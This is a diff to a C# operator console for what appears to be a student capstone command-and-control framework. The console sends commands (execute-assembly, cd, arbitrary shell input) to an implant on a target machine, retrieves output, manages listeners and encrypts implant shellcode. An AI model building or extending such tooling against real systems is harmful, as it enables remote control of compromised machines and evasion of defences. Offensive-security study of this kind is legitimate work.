@@ -13,6 +13,7 @@ using Newtonsoft.Json;
 using System.Net.Http;
 using MySqlX.XDevAPI;
 using Windows.Media.Protection.PlayReady;
+using System.Linq;
 
 namespace CapstoneInterface
 {
@@ -165,12 +166,12 @@ namespace CapstoneInterface
                 }
 
                 string result = alertsText.ToString();
-                rTxtMessagesBox.Text = result; // Ensure this runs on UI thread
+                //rTxtMessagesBox.Text = result; // Ensure this runs on UI thread
                 return result;
             }
             catch (Exception ex)
             {
-                rTxtMessagesBox.Text = "Error: " + ex.Message; // Debug statement
+                //rTxtMessagesBox.Text = "Error: " + ex.Message; // Debug statement
                 return "Error: " + ex.Message;
             }
         }
@@ -235,13 +236,13 @@ namespace CapstoneInterface
                 {
                     string[] result = input.Split(' ');
 
-                    // Assign the first part to a variable command
+                    // Assign the first part to a variable 'instruction'
                     string instruction = result[0];
 
-                    // Assign the second part to a variable file
-                    string command = result[1];
+                    // Join the remaining parts (if any) into a single string for 'args'
+                    string command = result.Length > 1 ? string.Join(" ", result.Skip(1)) : "";
 
-                    String userCommand = @" (04/25)> " + operatorName + " sent " + command + " to '" + userToControl + "'";
+                    string userCommand = @" (04/25)> " + operatorName + " sent " + command + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -249,6 +250,7 @@ namespace CapstoneInterface
 
                     commandForImplant.Input = instruction;
                     commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Args = "";
                     commandForImplant.Operator = operatorName;
                     commandForImplant.timeToExec = "0";
                     commandForImplant.delay = "0";
@@ -258,7 +260,6 @@ namespace CapstoneInterface
 
                     sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
-
                 else if (input.Contains("execute-assembly"))
                 {
                     string[] result = input.Split(' ');
@@ -291,22 +292,7 @@ namespace CapstoneInterface
                     string[] result = input.Split(' ');
 
                     string instruction = result[0];
-                    string className = result[1];
-                    string methodName = result[2];
-                    string encodedSourceCode = result[3]; // The base64 encoded source code
-
-                    instruction = instruction.TrimEnd();
-                    className = className.TrimStart();
-                    className = className.TrimEnd();
-                    methodName = methodName.TrimStart();
-                    methodName = methodName.TrimEnd();
-                    encodedSourceCode = encodedSourceCode.TrimStart();
-                    encodedSourceCode = encodedSourceCode.TrimEnd();
-
-                    txtConsoleOutput.AppendText("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
-                    byte[] code = Convert.FromBase64String(encodedSourceCode);
-                    string decodedSourceCode = Encoding.UTF8.GetString(code);
-                    txtConsoleOutput.AppendText("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");
+                    string cs = result[1];
 
                     String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
 
@@ -314,24 +300,26 @@ namespace CapstoneInterface
                     // Append the user command to the console output
                     txtConsoleOutput.AppendText(userCommand + "\r\n");
 
-                    commandForImplant.Input = instruction;
+                    commandForImplant.Input = input;
                     commandForImplant.ImplantUser = userToControl;
                     commandForImplant.Operator = operatorName;
                     commandForImplant.timeToExec = "0";
                     commandForImplant.delay = "0";
-                    commandForImplant.File = encodedSourceCode + "   " + className + "   " + methodName; // Combine encoded source code, class and method into one string
+                    commandForImplant.File = cs;
 
                     dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
 
                     sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
-                else if (input.Contains("internal"))
+
+                else if (input.Contains("cd"))
                 {
                     string[] result = input.Split(' ');
-                    string instruction = result[1];
-                    string command = result[2];
 
-                    String userCommand = @" (04/25)> " + operatorName + " sent " + command + " to '" + userToControl + "'";
+                    string instruction = result[0];
+                    string path = result[1];
+
+                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction + " to '" + userToControl + "'";
 
                     txtConsoleOutput.AppendText("\r\n\r\n");
                     // Append the user command to the console output
@@ -339,10 +327,33 @@ namespace CapstoneInterface
 
                     commandForImplant.Input = instruction;
                     commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Args = path;
                     commandForImplant.Operator = operatorName;
                     commandForImplant.timeToExec = "0";
                     commandForImplant.delay = "0";
-                    commandForImplant.command = command;
+                    commandForImplant.File = "";
+
+                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+                }
+
+                else
+                {
+                    string instruction = input;
+
+                    String userCommand = @" (04/25)> " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
+
+                    txtConsoleOutput.AppendText("\r\n\r\n");
+                    // Append the user command to the console output
+                    txtConsoleOutput.AppendText(userCommand + "\r\n");
+
+                    commandForImplant.Input = input;
+                    commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Operator = operatorName;
+                    commandForImplant.timeToExec = "0";
+                    commandForImplant.delay = "0";
+                    commandForImplant.File = "";
 
                     dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
 
@@ -361,7 +372,7 @@ namespace CapstoneInterface
             await Task.Delay(10000);
 
             // Fetch output from the /fetchOutput endpoint
-            HttpResponseMessage outputResponse = await client.GetAsync("http://" + host + ":" + port + "/getStoredOutput");
+            HttpResponseMessage outputResponse = await client.GetAsync("http://" + host + ":" + port + "/getOutput");
 
             if (outputResponse.IsSuccessStatusCode)
             {
@@ -599,7 +610,7 @@ Invoke-Run
                 var content = new StringContent(jsonString, Encoding.UTF8, "application/json");
                 try
                 {
-                    HttpResponseMessage response = await httpClient.PostAsync("http://localhost:8082/messagePost", content);
+                    HttpResponseMessage response = await httpClient.PostAsync($"http://{host}:{port}/messagePost", content);
                 }
                 catch (Exception ex)
                 {
@@ -627,7 +638,7 @@ Invoke-Run
         {
             try
             {
-                var response = await _httpClient.GetAsync("http://localhost:8082/messageGet");
+                var response = await _httpClient.GetAsync($"http://{host}:{port}/messageGet");
                 if (response.IsSuccessStatusCode)
                 {
                     var jsonString = await response.Content.ReadAsStringAsync();
@@ -723,12 +734,12 @@ Invoke-Run
                 }
                 else
                 {
-                    MessageBox.Show($"Error: {response.StatusCode}");
+                    //MessageBox.Show($"Error: {response.StatusCode}");
                 }
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"An error occurred: {ex.Message}");
+                //MessageBox.Show($"An error occurred: {ex.Message}");
             }
 
             // Adjust the DataGridView's properties
@@ -771,11 +782,9 @@ Invoke-Run
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"An error occurred: {ex.Message}");
+                //MessageBox.Show($"An error occurred: {ex.Message}");
             }
         }
-
-
 
         private string ReadFileContents(string filePath, string operation)
         {
@@ -866,12 +875,12 @@ Invoke-Run
 
         private void EncryptShellcode(string basedirWin)
         {
-            string pythonScriptPath = Path.Combine(basedirWin, "Encryption\\Cryptocutter.py");
+            string pythonScriptPath = "Cryptocutter.py";
             string inputFilePath = Path.Combine(basedirWin, "Encryption\\implant.bin");
-            string outputFilePath = Path.Combine(basedirWin, "OutputShellcode\\implant.bin");
+            string outputFilePath = Path.Combine(basedirWin, "Server\\OutputShellcode\\implant.bin");
 
             string arguments = $"\"{pythonScriptPath}\" -f \"{inputFilePath}\" -o \"{outputFilePath}\"";
-            /*txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);*/
+            //txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);
 
             ExecuteCommand("python", arguments);
 
@@ -1018,7 +1027,7 @@ Invoke-Run
 
                 try
                 {
-                    HttpResponseMessage response = await client.PostAsync("http://localhost:8082/generate/listener", content);
+                    HttpResponseMessage response = await client.PostAsync($"http://{host}:{port}/generate/listener", content);
                     //($"http://{host}:{port}/generate/listener");
 
                     if (response.IsSuccessStatusCode)
@@ -1033,19 +1042,19 @@ Invoke-Run
                             listBox1.Items.Add($"Name: {listener.Name}, IP: {listener.IP}, Port: {listener.Port}, Headers: {listener.Header}");
                         }
                         //Successfull response
-                        MessageBox.Show("HTTP Response Success!");
+                        //MessageBox.Show("HTTP Response Success!");
                         //string listenerInfo = $"Name: {newListener.Name}, Host: {newListener.Host}, Port: {newListener.Port}, Headers: {newListener.Headers}";
                     }
                     else
                     {
                         //Error in HTTP response 
-                        MessageBox.Show("HTTP Response Error!");
+                        //MessageBox.Show("HTTP Response Error!");
                     }
                 }
                 catch (Exception exception)
                 {
                     //Exception error
-                    MessageBox.Show($"Error: {exception.Message}");
+                    //MessageBox.Show($"Error: {exception.Message}");
                 }
             }
 
@@ -1072,7 +1081,7 @@ Invoke-Run
                 try
                 {
                     // Assuming you want to make a GET request
-                    var response = await client.GetAsync("http://127.0.0.1:8082/clearListeners");
+                    var response = await client.GetAsync($"http://{host}:{port}/clearListeners");
 
                     // Optional: Check the response status code
                     if (response.IsSuccessStatusCode)
@@ -1084,13 +1093,13 @@ Invoke-Run
                     else
                     {
                         // Handle the error
-                        MessageBox.Show($"Request failed with status code: {response.StatusCode}");
+                        //MessageBox.Show($"Request failed with status code: {response.StatusCode}");
                     }
                 }
                 catch (HttpRequestException httpRequestException)
                 {
                     // Handle any exceptions that occurred during the request
-                    MessageBox.Show($"Error making request: {httpRequestException.Message}");
+                    //MessageBox.Show($"Error making request: {httpRequestException.Message}");
                 }
             }
         }
